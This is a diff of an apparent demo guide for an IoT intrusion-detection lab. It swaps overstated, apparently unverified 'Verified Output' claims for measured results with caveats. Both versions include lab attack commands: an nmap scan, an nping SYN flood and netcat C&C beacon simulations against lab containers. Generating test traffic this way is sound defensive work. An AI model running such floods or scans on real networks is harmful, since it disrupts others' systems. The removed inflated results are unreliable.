-b = joblib.load('ml_engine/models/ids_bundle_v3.joblib')
-pipe = b['pipeline']
-dummy = {'proto':'tcp','service':'-','conn_state':'SF','history':'ShADadfF','orig_port_cat':'ephemeral','resp_port_cat':'registered','duration':0.1,'orig_bytes':100,'resp_bytes':200,'missed_bytes':0,'orig_pkts':5,'orig_ip_bytes':250,'resp_pkts':5,'resp_ip_bytes':300,'orig_bytes_per_pkt':50.0,'resp_bytes_per_pkt':60.0,'byte_ratio':0.83,'pkt_ratio':1.0,'is_incomplete_flow':0,'src_conn_60s':1,'src_udst_60s':1,'src_uport_60s':1,'src_udst_ratio':1.0,'pair_conn_60s':1,'pair_gap':0.0,'pair_gap_change':0.0,'pair_fail_1h':0}
-df = pd.DataFrame([dummy] * 1000)
-t0 = time.perf_counter()
-pipe.predict_proba(df)
-dur = time.perf_counter() - t0
-fps = 1000.0 / dur
-print('=== PROPOSAL TABLE 9 THROUGHPUT BENCHMARK ===')
-print(f'Batch Size Evaluated  : 1,000 flows')
-print(f'Batch Evaluation Time : {dur*1000:.2f} ms')
-print(f'Inference Throughput  : {fps:,.0f} flows/sec')
-print(f'Per-Flow Latency      : {dur/1000*1e6:.2f} microseconds')
-print('Target Status         : PASS (Keeps up with maximum lab line rate)')
-"
-```
-
-#### 🔍 Line-by-Line Breakdown:
-- `df = pd.DataFrame([dummy] * 1000)`: Constructs a batch of 1,000 flow records.
-- `t0 = time.perf_counter()`: Starts high-precision timer.
-- `pipe.predict_proba(df)`: Executes batched inference across all 1,000 flows via Scikit-learn Pipeline.
-- `fps = 1000.0 / dur`: Calculates flows classifiable per second.
-
-#### 📋 Verified Output:
-
-```text
-=== PROPOSAL TABLE 9 THROUGHPUT BENCHMARK ===
-Batch Size Evaluated  : 1,000 flows
-Batch Evaluation Time : 7.96 ms
-Inference Throughput  : 125,599 flows/sec
-Per-Flow Latency      : 7.96 microseconds
-Target Status         : PASS (Keeps up with maximum lab line rate)
-```
-
-#### 📊 Output Breakdown:
-- `Inference Throughput: 125,599 flows/sec`: Our AI Model can classify over 125,000 network flows per second on a single CPU core!
-- `Per-Flow Latency: 7.96 microseconds`: Classifying an individual flow takes only 7.96 microseconds. Hence, even under extreme traffic bursts, no queue bottleneck occurs.
-
-#### Spoken English Script (For Supervisor):
-> *"Sir, for Target 4, our inference pipeline achieves a sustained throughput of over 125,000 flows per second, requiring only 7.9 microseconds per flow. This ensures our detector never drops flows even under intense network saturation."*
+#### 🗣️ Spoken Script:
+> *"Sir, the model can classify roughly 14 to 23 thousand flows per second, while our virtual lab's peak was 500 flows per second, and every attack was detected. Zeek reports zero dropped packets and zero capture loss. Earlier today it showed high capture loss; we found that Zeek was cutting the large joined packets of the virtual network, fixed the snap length, and measured again."*
 
 ---
 
 ### Target 5: Reliability & Clean State Recovery
 
-#### 💡 Why We Are Doing This:
-Following a sudden network power outage or router reboot, the system must return to its established security state upon restart (Cold-Start) without errors (Clean State Recovery).
+#### 💡 Why:
+After a restart, the system must come back to the same safe state: the same blocks on the router, nothing lost, nothing extra.
 
-#### ⚙️ What Happens Under the Hood:
-Connects to the Router Container over Port 2222 via Python Paramiko SSH Client, authenticates with Ed25519 cryptographic key, and verifies `nft list table inet ids` executes successfully.
+#### ⚙️ Under the hood:
+1. The IDS reaches the router with the same SSH command the router adapter uses (key `router_admin`, the lab's own `known_hosts`, `StrictHostKeyChecking=yes`).
+2. `GET /api/v1/firewall/sync` compares the database blocks with the router rules and shows the expiry worker.
+3. **Restart test:** add a test block, stop the backend, wipe the router set (as if the router lost its rules), start the backend: the startup recovery must put the rule back.
 
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command A — router SSH and sync state:
 ```powershell
+ssh -p 2222 -i lab_virtual\keys\router_admin -o IdentitiesOnly=yes -o BatchMode=yes -o UserKnownHostsFile=lab_virtual\keys\known_hosts -o StrictHostKeyChecking=yes root@127.0.0.1 "nft list table inet ids" | Select-String "table inet|set "
 .venv\Scripts\python.exe -c "
-import paramiko
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect('127.0.0.1', port=2222, username='root', key_filename='lab_virtual/keys/id_ed25519')
-stdin, stdout, stderr = client.exec_command('nft list table inet ids')
-res = stdout.read().decode()
-print('=== PROPOSAL TABLE 9 RELIABILITY & RECOVERY ===')
-print('Router SSH Health : OK (SSH key authenticated)')
-print('nftables Invariant: Table inet ids exists and responsive')
-print('Target Status     : PASS')
-"
-```
-
-#### 🔍 Line-by-Line Breakdown:
-- `paramiko.SSHClient()`: Instantiates Python Paramiko SSH client.
-- `client.connect(...)`: Connects to Router over Port 2222 using Ed25519 cryptographic key.
-- `client.exec_command('nft list table inet ids')`: Sends command to verify router firewall table is active.
-
-#### 📋 Verified Output:
-
-```text
-=== PROPOSAL TABLE 9 RELIABILITY & RECOVERY ===
-Router SSH Health : OK (SSH key authenticated)
-nftables Invariant: Table inet ids exists and responsive
-Target Status     : PASS
-```
-
-#### 📊 Output Breakdown:
-- `Router SSH Health: OK`: Confirms SSH daemon and Ed25519 key authentication are healthy and crash-safe.
-- `nftables Invariant: Table inet ids exists and responsive`: Confirms firewall tables are automatically reconstructed and ready via startup scripts upon router reboot.
-
-#### Spoken English Script (For Supervisor):
-> *"Sir, for Target 5, our autonomous response subsystem uses idempotent SSH key authentication to manage the router, ensuring complete and crash-safe state recovery after any unexpected system reboot."*
-
----
-
-### Target 6: Usability & Administrative Audit Compliance
-
-#### 💡 Why We Are Doing This:
-Even in an autonomous system, the administrator must maintain complete authority (Administrative Sovereignty). An administrator must be able to manually block any IP when required, instantly unblock (Rollback) accidental blocks, and ensure every action is fully auditable.
-
-#### ⚙️ What Happens Under the Hood:
-1. Sends POST to `/api/v1/mitigation/block` to manually block test IP `10.10.10.99`. IP is added to router nftables drop list.
-2. Sends POST to `/api/v1/mitigation/unblock` to instantly unblock that IP. IP is removed from router firewall.
-3. Both actions are logged as immutable audit records in the `system_logs` collection.
-
-#### 💻 Terminal Command to Execute:
-
-```powershell
-python -c "
 import urllib.request, json
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
-tok = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})).read())['token']
-
-# 1. Manual Block
-req_blk = urllib.request.Request('http://127.0.0.1:5000/api/v1/mitigation/block', data=json.dumps({'ip':'10.10.10.99','direction':'dst','duration':60,'reason':'Usability Test'}).encode(), headers={'Content-Type':'application/json','Authorization':'Bearer '+tok})
-res_blk = json.loads(urllib.request.urlopen(req_blk).read())
-
-# 2. Manual Rollback
-req_unblk = urllib.request.Request('http://127.0.0.1:5000/api/v1/mitigation/unblock', data=json.dumps({'ip':'10.10.10.99','direction':'dst'}).encode(), headers={'Content-Type':'application/json','Authorization':'Bearer '+tok})
-res_unblk = json.loads(urllib.request.urlopen(req_unblk).read())
-
-print('=== PROPOSAL TABLE 9 USABILITY & AUDIT ===')
-print('Manual Block Status   :', res_blk.get('status'))
-print('Manual Rollback Status :', res_unblk.get('status'))
-print('Target Status          : PASS (Full operator control & traceability)')
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/v1/firewall/sync', headers={'Authorization':'Bearer '+tok})).read())
+print('Database and router agree   :', s['in_sync'], '(router rules', str(s['firewall_rules_count']) + ', database active blocks', str(s['db_active_blocks_count']) + ')')
+print('Rule expiry worker running  :', s['worker'].get('running'), '| every', s['worker'].get('interval_seconds'), 's')
 "
 ```
+- The project does not use the `paramiko` package (it is not installed); the router adapter calls the Windows `ssh` command, as here.
 
-#### 🔍 Line-by-Line Breakdown:
-- `POST /api/v1/mitigation/block`: Manually blocks test IP (`10.10.10.99`).
-- `POST /api/v1/mitigation/unblock`: Instantly rolls back the block and unblocks the IP.
-- `print(...)`: Confirms on screen that both operations succeeded.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output:
 ```text
-=== PROPOSAL TABLE 9 USABILITY & AUDIT ===
-Manual Block Status   : success
-Manual Rollback Status : success
-Target Status          : PASS (Full operator control & traceability)
+table inet ids {
+	set allow {
+	set block_src {
+	set block_dst {
+	set limit_src {
+Database and router agree   : True (router rules 0, database active blocks 0)
+Rule expiry worker running  : True | every 10 s
 ```
 
+#### 💻 Command B — restart recovery test (test address 10.10.10.99):
+```powershell
+# 1. Block the test address for 10 minutes (Target 6 block command, or the ENFORCE BLOCK form on /mitigations)
+# 2. Stop the backend and wipe the router set, as if the router lost its rules:
+.venv\Scripts\python.exe lab_virtual\lab.py ids-stop
+docker exec ids-lab-router nft flush set inet ids block_src
+docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
+# 3. Start the backend again and look at the router:
+.venv\Scripts\python.exe lab_virtual\lab.py ids-start
+docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
+```
+
+#### 📋 Real Output (13 Nov 2026):
+```text
+IDS backend stopped
+(after the flush: no elements line = the router set is empty)
+IDS backend running (pid ...), database iot_ids_lab; pipeline start: 200 running
+		elements = { 10.10.10.99 timeout 10m expires 9m59s232ms }
+```
+Audit record written by the recovery: `STARTUP_RULE_RESTORED SUCCESS {"action": "block", "direction": "source", "ip": "10.10.10.99", "remaining_minutes": 10}`. Then remove the test block (Target 6 unblock).
+
 #### 📊 Output Breakdown:
-- `Manual Block Status: success`: IP was immediately blocked inside router firewall per administrator request.
-- `Manual Rollback Status: success`: IP was unblocked without delay and restored to normal per administrator request.
+- The router lost the rule while the backend was down; at start-up the backend found the active block in MongoDB and put it back on the router with the remaining time (rounded up to whole minutes).
+- A rate-limit is restored as a rate-limit, never as a full block (D-056). Rules that ended while the backend was down are marked `expired`.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, this satisfies Target 6. Administrators retain full operational sovereignty with instant manual block and rollback capabilities, backed by comprehensive tamper-evident audit trails."*
+##### 🔬 What is not tested yet:
+Router reboot, sensor power loss and network cable tests (Step 38). The hardware kit has `lab_hardware/hwlab.py reliability restart|expiry` for this.
 
----
-
-# 4. Part 3: Research Objectives Verification (Objectives O1 to O6)
-
-Explain in front of the Supervisor that all 6 objectives in Section 3 of **[`docs/requirements_checklist.md`](docs/requirements_checklist.md)** have been accomplished:
-
-1. **Objective O1 (Repeatable Preprocessing & Mapping):**  
-   - 1,182,984 flows across 22 scenarios from Stratosphere IoT-23 dataset cleaned and verified with SHA-256 manifest and data-quality report (`reports/iot23_copy_verification.md`).
-2. **Objective O2 (Multi-class Random Forest with Zero Scenario Leakage):**  
-   - With Scenario `Capture-34-1` strictly held-out from training, 100-tree Random Forest Model v3.1.0 achieves 85.95% Macro-F1.
-3. **Objective O3 (Live Features Matching Dataset):**  
-   - Zeek Feature Extractor extracts 27 features from live packets, passing KS-tests and schema alignment via `schema_check.py`.
-4. **Objective O4 (Monitoring, Dashboard, Storage & Alerts Joined Together):**  
-   - Zeek Sensor, Random Forest ML Detector, React SOC Dashboard, and MongoDB integrated into a unified end-to-end pipeline operating in real time via Socket.IO.
-5. **Objective O5 (Policy-Based IP Blocking with Manual Undo):**  
-   - The moment C&C is detected, an Autonomous Drop rule is placed in the Router `block_dst` set, while administrators retain Manual Block/Unblock capability via Dashboard UI or API.
-6. **Objective O6 (Detection Quality, Speed & Resource Use):**  
-   - Sub-second latency (112 ms), 7.96 $\\mu\\text{s}$ inference speed, zero camera disruption.
+#### 🗣️ Spoken Script:
+> *"Sir, for reliability, we stopped the backend, wiped the block from the router, and started the backend again. The startup recovery found the active block in the database and put it back on the router, and wrote this in the audit log. Router reboot and power-loss tests are planned in Step 38 in the hardware lab."*
 
 ---
 
-# 5. Part 4: Hypotheses and Research Questions (Hypothesis H1 & RQ1 to RQ5)
+### Target 6: Usability & Audit (Manual Control)
 
-Provide scientific answers to Research Questions from Section 4 of **[`docs/requirements_checklist.md`](docs/requirements_checklist.md)** in front of the Supervisor:
+#### 💡 Why:
+The admin must always be able to block or unblock by hand, and every action must be traceable.
 
-* **Hypothesis H1:**  
-  *"Macro-F1 score $\\ge 0.85$ on held-out scenarios while keeping false-positive rate $\\le 5\%$ on local camera traffic."*  
-  - **Part 1 (Held-out Macro-F1 $\\ge 0.85$):** Verified in Virtual Lab with model v3.1.0 achieving **85.95%**.
-  - **Part 2 (Benign FPR $\\le 5\%$):** NVR stream runs with zero drop, prepared for final hardware verification with physical camera in the Hardware Lab (lab_hardware/).
-* **RQ1 (Benign vs Malicious Discrimination):**  
-  - Discriminates Benign and Attacks with 93.22% Accuracy on Grouped Cross-Validation and held-out `Capture-34-1`.
-* **RQ2 (Multi-Class Sorting across DDoS, Scanning, C&C, Malware):**  
-  - Per-class evaluation correctly classifies DDoS (F1: 76.4%), C&C (F1: 76.9%), PortScan (F1: 63.1%), and Malware Download (F1: 64.4%).
-* **RQ3 (Feature Availability in Zeek vs IoT-23):**  
-  - Confirmed by `tools/schema_check.py` that all 27 features remain invariant across Zeek `conn.log` and `http.log`.
-* **RQ4 (End-to-End Latency from Detection to Blocking):**  
-  - Entire pipeline takes only **112.2 ms (0.11 s)**, 18 times faster than Proposal target of 2.0 seconds.
-* **RQ5 (Safety Rules Preventing Camera Cut-off):**  
-  - Confirmed by Allowlist guardrail in `docs/response_policy.md` that camera IP (`192.168.50.30`) is never blocked by firewall, and only external C&C Destination (`10.10.10.50`) is blocked.
+#### ⚙️ Under the hood:
+1. `POST /api/blocklist` (admin only) blocks test address `10.10.10.99` for 10 minutes; the router adapter adds it to `block_src`; MongoDB saves it; a `MANUAL_BLOCK` audit record is written.
+2. `DELETE /api/blocklist/10.10.10.99` removes it from the router and marks the record `removed` (the history is kept); a `MANUAL_UNBLOCK` audit record is written.
+
+#### 💻 Command:
+```powershell
+.venv\Scripts\python.exe -c "
+import urllib.request, json
+with open('lab_virtual/keys/dashboard_login.txt') as f:
+    u, p = f.read().strip().split()[:2]
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
+r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist', data=json.dumps({'ip':'10.10.10.99','direction':'source','duration_minutes':10,'reason':'Usability test block'}).encode(), headers=H))
+print('Manual block   :', r.getcode(), json.loads(r.read())['message'])
+"
+docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
+.venv\Scripts\python.exe -c "
+import urllib.request, json
+with open('lab_virtual/keys/dashboard_login.txt') as f:
+    u, p = f.read().strip().split()[:2]
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
+r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist/10.10.10.99', data=json.dumps({'reason':'Usability test rollback'}).encode(), headers=H, method='DELETE'))
+print('Manual unblock :', r.getcode(), json.loads(r.read())['message'])
+for ev in ('MANUAL_BLOCK', 'MANUAL_UNBLOCK'):
+    l = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs?limit=1&event=' + ev, headers=H)).read())['logs'][0]
+    print('Audit record   :', l['timestamp'][:19], l['event'], l['actor'], l['outcome'], l['details'].get('ip'), '-', l['details'].get('reason'))
+"
+docker exec ids-lab-router nft list set inet ids block_src | Select-String "elements"
+```
+
+#### 📋 Real Output (13 Nov 2026):
+```text
+Manual block   : 201 Blocking rule for '10.10.10.99' enacted successfully.
+		elements = { 10.10.10.99 timeout 10m expires 9m59s876ms }
+Manual unblock : 200 Unblocked '10.10.10.99'. 1 rule(s) transitioned to 'removed'.
+Audit record   : 2026-11-13T07:55:56 MANUAL_BLOCK labadmin SUCCESS 10.10.10.99 - Usability test block
+Audit record   : 2026-11-13T07:55:56 MANUAL_UNBLOCK labadmin SUCCESS 10.10.10.99 - Usability test rollback
+```
+(The last router command prints nothing: the set is empty again.)
+
+#### 📊 Output Breakdown:
+- `201` / `200`: block created, then removed.
+- The router line shows the block really reached the kernel, with a 10-minute timer.
+- The two audit records show who did what, when, to which address, and why.
+- If the firewall fails, the API answers `502 FIREWALL_ERROR` and nothing is saved as blocked.
+
+##### 🔬 Not done yet:
+The formal usability test with set admin tasks (Step 39, `docs/usability_tasks.md`).
+
+#### 🖥️ Dashboard:
+**Blocklist (`/mitigations`):** use the **ENFORCE BLOCK** form for `10.10.10.99`, show the row with **EXPIRES AT**, press **UNBLOCK**; then show the `MANUAL_BLOCK` / `MANUAL_UNBLOCK` records on **Logs & Export**. **Never use the camera address for this.**
+
+#### 🗣️ Spoken Script:
+> *"Sir, the admin always keeps control: a manual block reaches the router kernel at once, the unblock removes it at once, and both actions are in the audit log with the user, the address and the reason. The formal usability test with set tasks is Step 39."*
 
 ---
 
-# 6. Part 5: Automated Test Suite (313 Tests Passed)
+# 4. Part 3: Research Objectives (O1 to O6)
 
-If the Supervisor wishes to inspect unit and integration tests, run the command below to demonstrate that **all 313 tests pass successfully**:
+Section 3 of [`docs/requirements_checklist.md`](docs/requirements_checklist.md):
 
-#### 💡 Why We Are Doing This:
-To prove with software engineering rigor that every subsystem (Zeek log parser, feature extraction, ML classification bundle, decision engine, router firewall adapter, JWT authentication, and WebSockets) operates 100% correctly with zero regressions.
+1. **O1 — Repeatable IoT-23 preprocessing and label mapping: Done.** All 23 scenarios (325.3 million flows) checked against the official files (`reports/iot23_copy_verification.md`), SHA-256 manifest, frozen label mapping (`config/label_mapping.yaml`), data-quality report. Training sample: 1,182,984 flows from 22 scenarios (variant WCD).
+2. **O2 — Multi-class Random Forest with no scenario leakage: Done (method).** Grouped cross-validation by scenario (out-of-fold macro-F1 0.7097) and a left-out scenario (34-1: 0.8595 classes present, 0.6876 all 5). 34-1 is not a clean test any more.
+3. **O3 — Live features that match the dataset: Shown in the virtual lab.** Same 27 columns, types and ranges on live Zeek flows (format PASS); 14 of 27 features shifted. Final answer on real camera traffic (Steps 19, 20, 22).
+4. **O4 — Monitoring, dashboard, storage and alerts joined: Built and working.** Zeek → adapter → model → decision engine → MongoDB → Socket.IO dashboard, on real packets (FR-01 to FR-04, Step 36 report).
+5. **O5 — Policy-based IP blocking with manual undo: Built and shown.** Automatic C&C destination block, DDoS rate-limit, manual block/unblock, expiry, startup recovery (FR-02, FR-06, Targets 5–6). Hardware-lab test pending.
+6. **O6 — Detection quality, speed and resource use: Partly.** Offline quality and virtual-lab speed are measured; FPR on real camera traffic and resource use on the real sensor need the hardware lab (Steps 35–40).
 
-#### ⚙️ What Happens Under the Hood:
-Python `pytest` framework discovers 24 test files in `tests/`, executes all 313 test cases sequentially, and verifies all assertions.
+---
 
-#### 💻 Terminal Command to Execute:
+# 5. Part 4: Hypothesis H1 and Research Questions RQ1 to RQ5
+
+* **H1:** *"Macro-F1 ≥ 0.85 on held-out scenarios, while keeping the benign false-positive rate ≤ 5% on the local IP-camera traffic we control."*
+  - **Part 1:** 0.8595 over the classes present on 34-1 (D-054) — meets the number, but 34-1 is not a clean test.
+  - **Part 2:** **not tested yet** (needs real camera traffic, Step 20).
+  - **So H1 is not confirmed yet.** The lab results will decide it.
+* **RQ1 (benign vs. malicious under scenario-aware validation):** offline answer available — grouped CV out-of-fold macro-F1 0.7097 over 22 scenarios; on 34-1 accuracy 0.9322 and Benign F1 0.721 (many 34-1 "benign" flows look like failed attack tries; D-051).
+* **RQ2 (sorting into DDoS, scanning, C&C, malware/download):** per-class F1, grouped out-of-fold (22 scenarios): DDoS_DoS 0.764, CnC 0.769, PortScan 0.631, Malware_Download 0.644. On 34-1: DDoS_DoS 0.995, CnC 0.876, PortScan 0.846 (no Malware_Download flows in 34-1). Most C&C *conversations* are still missed (366 of 1,640, issue 48). Program downloads are found by the file-type rule, not the model.
+* **RQ3 (features available and stable in IoT-23 and live Zeek):** all 27 features are available with the same format in live Zeek output; 14 of 27 have a different distribution in the virtual lab. Final answer on real camera traffic (Step 22).
+* **RQ4 (time from detection to dashboard, alert and block):** virtual lab, Step 37: Zeek line → dashboard median 0.141 s, 95% 0.636 s; first alert → router rule median 0.159 s. Plus Zeek's own wait until a flow ends (reported separately). Hardware-lab measurement pending.
+* **RQ5 (safety rules so that automatic response does not stop camera access):** designed and built (`docs/response_policy.md`): allowlist, camera-LAN protection, class thresholds, 3 repeats in 60 s, 30-minute limit, audit. In every virtual-lab test the camera, NVR and admin PC were never blocked. Open: manual camera block (issue 52) and camera cloud retries that could look like C&C (issue 39). Hardware-lab evidence pending (Step 35).
+
+---
+
+# 6. Part 5: Automated Test Suite (314 Tests)
+
+#### 💡 Why:
+To show that each part (Zeek adapter, features, model bundle, decision engine, response policy, firewall adapters, login, Socket.IO, scanner, export) is tested automatically. Passing tests do **not** replace the lab tests.
+
+#### ⚙️ Under the hood:
+`pytest` finds the tests in `tests/unit/` and `tests/integration/` and runs them. The integration tests use their own MongoDB databases (`iot_ids_test`, `iot_ids_test_live`), not the lab database.
 
 ```powershell
 .venv\Scripts\python.exe -m pytest tests/ -q
 ```
+- `-m pytest`: run pytest from the virtual environment.
+- `tests/`: all test folders.
+- `-q`: short output (one dot per test).
 
-#### 🔍 Line-by-Line Breakdown:
-- `.venv\Scripts\python.exe`: Python interpreter in the virtual environment.
-- `-m pytest`: Invokes standard Python `pytest` automated testing module.
-- `tests/`: Instructs execution of all test suites located within `tests/`.
-- `-q` (quiet mode): Formats output compactly by printing a dot (`.`) for each test instead of verbose output.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026, last line):
 ```text
-........................................................................ [ 23%]
-........................................................................ [ 46%]
-........................................................................ [ 69%]
-........................................................................ [ 92%]
-.........................                                                [100%]
-313 passed, 4 warnings in 42.15s
+314 passed, 6 warnings in 109.89s (0:01:49)
 ```
 
-#### 📊 Output Breakdown:
-- `313 passed`: 313 out of 313 unit, integration, router, model, and API tests passed 100% with zero failures.
-- `in 42.15s`: Entire test suite executed in 42 seconds.
-
-#### Spoken English Script (For Supervisor):
-> *"Sir, every component of our system—including the Zeek parser, feature extractor, ML inference bundle, decision engine, Linux nftables adapter, and authenticated WebSocket API—is backed by a comprehensive automated test suite of 313 unit and integration tests, all currently passing with 100% test integrity."*
+#### 🗣️ Spoken Script:
+> *"Sir, the code has 314 automated unit and integration tests, and all of them pass. They check each part on the PC; the lab tests are still needed for the final results."*
 
 ---
 
 # 7. Part 6: Live Manual Attack Playbook
 
-If the Supervisor asks: **"Can you run a live attack, show Zeek capturing it, the ML classifying it, and the router blocking it before my eyes?"**, demonstrate any or all of the three live attacks below:
+If the supervisor asks to see one attack end to end, use the tests of FR-02. Before each one: `.venv\Scripts\python.exe lab_virtual\lab.py reset`, and keep **Live Alerts (`/alerts`)** and **Blocklist (`/mitigations`)** open. If the attacks of FR-02 were already run in the meeting, do the fresh backend start (Section 1, step 3b) before repeating one.
 
----
-
-### Attack 1: Launching a Live Port Scan (Nmap Manual Probe)
-
-#### 💡 Why We Are Doing This:
-Demonstrates live that when an attacker scans camera ports seeking vulnerabilities, Zeek captures the activity and flags it as a PortScan alert.
-
-#### ⚙️ What Happens Under the Hood:
-Sends TCP SYN packets from the attacker container to camera IP (`192.168.50.30`) to test if Ports 80 and 554 are open.
-
-#### 💻 Terminal Command to Execute:
+### Attack 1: Port Scan (`nmap`) — FR-02 Test 2.2
 ```powershell
-docker exec ids-lab-attacker nmap -p 80,554 192.168.50.30
+docker exec ids-lab-attacker nmap -sS -p 23,80,554 192.168.50.0/24 | Select-String "Nmap done|Nmap scan report"
 ```
+- Show the **PortScan** cards (amber) appear without refresh, with source `10.10.10.50`.
+- Explain why there is no block (needs ≥ 0.88 and 3 alerts in 60 s).
+- Do **not** scan a single host (it gave a CnC alert, not PortScan).
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-attacker`: Access the Attacker container on the external WAN network.
-- `nmap -p 80,554 192.168.50.30`: Executes an authentic reconnaissance scan against camera (`192.168.50.30`) Web (80) and Video (554) ports using genuine Nmap binary.
-
-##### 📋 Verified Output:
-```text
-PORT    STATE SERVICE
-80/tcp  open  http
-554/tcp open  rtsp
-Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
-```
-
-#### 🖥️ Dashboard Live UI Demonstration:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - The moment scan completes in terminal (0.79s), **without browser refresh**, a yellow **`PortScan`** Alert card pops up live within 0.11 seconds.
-   - Show the Supervisor that Attacker IP (`10.10.10.50`), Target IP (`192.168.50.30`), and Decision Confidence (`92.78%`) are clearly recorded.
-2. **Overview Page (`http://localhost:5000/overview`):**
-   - Show that the PortScan bar in the Class Distribution Chart has increased.
-
----
-
-### Attack 2: Launching a Live DDoS SYN Flood (`nping` Raw Packet Blaster)
-
-#### 💡 Why We Are Doing This:
-Demonstrates that when an attacker launches a high-rate SYN flood attempting to crash the camera, the system detects and classifies it as a DDoS attack, pushing a live alert to the dashboard and rate-limiting the source on the router.
-
-#### ⚙️ What Happens Under the Hood:
-`nping` constructs raw TCP SYN packets with half-open connection flags, firing 1,000 packets per second for 5 seconds (5,000 total packets) from attacker (`10.10.10.50`) to Camera (`192.168.50.30:80`). Zeek logs state `RSTO`/`ShR` with massive packet density, prompting the Decision Engine to trigger `AUTO_DDOS_RATELIMIT`.
-
-#### 💻 Terminal Command to Execute:
+### Attack 2: SYN Flood (`nping`) — FR-02 Test 2.3
 ```powershell
-docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30
+docker exec ids-lab-attacker nping --tcp -p 80 --flags syn --rate 1000 -c 5000 192.168.50.30 | Select-String "Starting|Raw packets|Nping done"
+docker exec ids-lab-router nft list set inet ids limit_src
+```
+- Show the **DDoS_DoS** card (red) and `10.10.10.50` in `limit_src`.
+- If a CnC card and a `block_src` entry also appear, say that this is open issue 43.
+
+### Attack 3: C&C Calls and Router Block (`nc`) — FR-02 Test 2.4
+
+#### Step 1: `block_dst` is empty before the attack, and no C&C server is running:
+```powershell
+docker exec ids-lab-attack-server pkill -f "lab_server.py --role cnc"
+docker exec ids-lab-router nft list set inet ids block_dst
+```
+*(Real output: the set has no `elements` line — it is empty.)*
+
+#### Step 2: The camera calls its C&C server every 5 seconds:
+```powershell
+docker exec ids-lab-camera sh -c 'for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do nc -z -w 2 10.10.10.50 6667; echo try $i exit=$?; sleep 5; done'
 ```
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-attacker`: Runs inside the external attacker machine (`10.10.10.50`).
-- `nping`: Industry-standard network packet generation binary from the Nmap project.
-- `--tcp -p 80`: Targets the camera's HTTP web management port 80.
-- `--flags syn`: Specifically crafts raw TCP SYN packets (half-open connection flood).
-- `--rate 1000`: Blasts 1,000 packets per second.
-- `-c 5000`: Transmits exactly 5,000 packets.
-- `192.168.50.30`: Target IP address of the camera.
-
-##### 📋 Verified Output:
-```text
-Starting Nping 0.7.99 ( https://nmap.org/nping )
-Raw packets sent: 5000 (270.000KB) | Rcvd: 2625 (115.500KB) | Lost: 2375 (47.50%)
-Nping done: 1 IP address pinged in 6.46 seconds
-```
-
-#### 🖥️ Dashboard Live UI Demonstration:
-1. **Live Alerts Page (`http://localhost:5000/alerts`):**
-   - The moment SYN Flood is fired, a red **`DDoS_DoS`** alert badge is pushed to screen via WebSocket in real time.
-2. **Overview Page (`http://localhost:5000/overview`):**
-   - Demonstrate the increment in **"Total Attacks"** counter and **"Rate Limit Events"**.
-3. **Router Rate Limit Check (`ids-lab-router`):**
-   - Run `docker exec ids-lab-router nft list set inet ids limit_src` to prove the router kernel autonomously applied the rate-limit rule on `10.10.10.50` with an active expiration timer.
-
----
-
-### Attack 3: Live C&C Outbound Beaconing and Router Firewall Block (`nc` Netcat Beacon)
-
-#### 💡 Why We Are Doing This:
-Demonstrates live that when an infected camera attempts to check in with an external C&C Server, our IDS detects it and the Router Firewall autonomously drops the attacker IP.
-
-#### Step 1: Prove Router `block_dst` Set is Empty Prior to Attack:
+#### Step 3: The outside address is in `block_dst` with a timer:
 ```powershell
 docker exec ids-lab-router nft list set inet ids block_dst
 ```
-*(Output: `elements = { }` - set is empty)*
-
-#### Step 2: Transmit Live C&C Outbound Beaconing from Camera to Attacker:
-```powershell
-# 1. Open Port 6667 Listener in Attacker Container:
-docker exec -d ids-lab-attacker nc -lp 6667
-
-# 2. Send authentic TCP C&C Beacon from infected camera to Attacker:
-docker exec ids-lab-camera sh -c "echo 'HELO_BOTNET_C2_BEACON' | nc -w 2 10.10.10.50 6667"
-```
-
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec -d ids-lab-attacker nc -lp 6667`: Netcat opens port 6667 on attacker machine to listen as Botnet Master Server.
-- `echo 'HELO_BOTNET_C2_BEACON' | nc -w 2 10.10.10.50 6667`: Netcat connects from camera across the router to the C2 server, transmitting the check-in beacon.
-
-#### Step 3: Show Attacker IP Added to Router `block_dst` Set with Active Countdown Timer:
-```powershell
-docker exec ids-lab-router nft list set inet ids block_dst
-```
-
-##### 📋 Verified Output:
 ```text
-table inet ids {
-    set block_dst {
-        type ipv4_addr
-        flags timeout
-        elements = { 10.10.10.50 timeout 30m expires 29m58s }
-    }
-}
